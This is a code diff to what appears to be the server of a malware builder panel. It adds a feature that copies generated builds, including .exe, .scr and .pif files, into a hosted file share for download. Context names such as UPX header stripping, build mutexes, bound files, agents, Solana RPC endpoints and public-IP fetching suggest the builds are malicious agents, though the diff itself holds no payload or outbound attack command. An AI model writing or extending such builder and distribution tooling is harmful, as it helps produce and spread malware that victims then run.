@@ -2,7 +2,8 @@ import { $ } from "bun";
 import path from "path";
 import fs from "fs";
 import { v4 as uuidv4 } from "uuid";
-import { saveBuild } from "../db";
+import { saveBuild, insertSharedFile, type SharedFileRecord } from "../db";
+import { getUserById, canUploadFiles } from "../users";
 import { logger } from "../logger";
 import { getConfig } from "../config";
 import { signBuildToken } from "./build-signing";
@@ -117,6 +118,7 @@ type BuildProcessConfig = {
   solRpcEndpoints?: string;
   iosBundleId?: string;
   fetchPublicIP?: boolean;
+  uploadToFileShare?: boolean;
 };
 
 
@@ -148,7 +150,127 @@ function stripUpxHeaders(filePath: string): boolean {
 type BuildProcessDeps = {
   generateBuildMutex: (length?: number) => string;
   sanitizeOutputName: (name: string) => string;
+  fileShareRoot?: string;
 };
+
+function guessMimeTypeForUpload(filename: string): string {
+  const ext = path.extname(filename).toLowerCase();
+  switch (ext) {
+    case ".exe":
+    case ".dll":
+    case ".scr":
+    case ".com":
+    case ".pif":
+      return "application/vnd.microsoft.portable-executable";
+    case ".bat":
+    case ".cmd":
+      return "application/bat";
+    case ".bin":
+      return "application/octet-stream";
+    case ".ipa":
+      return "application/octet-stream";
+    case ".sgn":
+      return "application/octet-stream";
+    default:
+      return "application/octet-stream";
+  }
+}
+
+async function uploadBuildFilesToFileShare(
+  build: BuildStream,
+  outDir: string,
+  fileShareRoot: string,
+  userId: number,
+  sendToStream: (data: any) => void,
+): Promise<void> {
+  const dbUser = getUserById(userId);
+  if (!dbUser) {
+    sendToStream({
+      type: "output",
+      text: "WARNING: Skipping file-share upload — uploading user not found.\n",
+      level: "warn",
+    });
+    return;
+  }
+  if (!canUploadFiles(dbUser.id, dbUser.role)) {
+    sendToStream({
+      type: "output",
+      text: "WARNING: Skipping file-share upload — you do not have upload permission.\n",
+      level: "warn",
+    });
+    return;
+  }
+
+  await fs.promises.mkdir(fileShareRoot, { recursive: true });
+
+  sendToStream({ type: "status", text: "Uploading build to file share..." });
+  sendToStream({
+    type: "output",
+    text: `\n── Uploading ${build.files.length} file(s) to file share ──\n`,
+    level: "info",
+  });
+
+  for (const file of build.files as any[]) {
+    const filename: string = file.filename || file.name;
+    if (!filename) continue;
+    const sourcePath = path.join(outDir, filename);
+    if (!fs.existsSync(sourcePath)) {
+      sendToStream({
+        type: "output",
+        text: `WARNING: Build output not found on disk for upload: ${filename}\n`,
+        level: "warn",
+      });
+      continue;
+    }
+    try {
+      const id = uuidv4();
+      const folder = path.join(fileShareRoot, id);
+      await fs.promises.mkdir(folder, { recursive: true });
+      const targetPath = path.join(folder, filename);
+      await fs.promises.copyFile(sourcePath, targetPath);
+      const size = fs.statSync(targetPath).size;
+
+      const record: SharedFileRecord = {
+        id,
+        filename,
+        storedPath: targetPath,
+        size,
+        mimeType: guessMimeTypeForUpload(filename),
+        uploadedBy: dbUser.id,
+        uploadedByUsername: dbUser.username,
+        passwordHash: null,
+        maxDownloads: null,
+        downloadCount: 0,
+        expiresAt: null,
+        createdAt: Date.now(),
+        description: `Build ${build.id.substring(0, 8)} — ${file.platform || "unknown"}`,
+      };
+      insertSharedFile(record);
+
+      logger.info(
+        `[file-share] ${dbUser.username} uploaded "${filename}" (${size} bytes) id=${id} via build ${build.id.substring(0, 8)}`,
+      );
+      sendToStream({
+        type: "output",
+        text: `Uploaded ${filename} (${size} bytes) → file share id ${id}\n`,
+        level: "success",
+      });
+      sendToStream({
+        type: "file_share_uploaded",
+        id,
+        filename,
+        platform: file.platform || null,
+        size,
+      });
+    } catch (err: any) {
+      sendToStream({
+        type: "output",
+        text: `WARNING: Failed to upload ${filename} to file share: ${err.message || err}\n`,
+        level: "warn",
+      });
+    }
+  }
+}
 
 function detectAgentVersion(clientDir: string): string {
   try {
@@ -1267,6 +1389,31 @@ func runBoundFiles() {
     build.status = "completed";
     logger.info(`[build:${buildId.substring(0, 8)}] Build completed successfully! Built ${build.files.length} file(s)`);
     sendToStream({ type: "output", text: `\n[OK] Build completed successfully!\n`, level: "success" });
+
+    if (config.uploadToFileShare && config.builtByUserId && deps.fileShareRoot) {
+      try {
+        await uploadBuildFilesToFileShare(
+          build,
+          outDir,
+          deps.fileShareRoot,
+          config.builtByUserId,
+          sendToStream,
+        );
+      } catch (uploadErr: any) {
+        sendToStream({
+          type: "output",
+          text: `WARNING: File-share upload failed: ${uploadErr.message || uploadErr}\n`,
+          level: "warn",
+        });
+      }
+    } else if (config.uploadToFileShare && !deps.fileShareRoot) {
+      sendToStream({
+        type: "output",
+        text: "WARNING: File-share upload requested but file share is not configured on this server.\n",
+        level: "warn",
+      });
+    }
+
     sendToStream({ type: "complete", success: true, files: build.files, buildId, expiresAt: build.expiresAt });
 
     saveBuild({
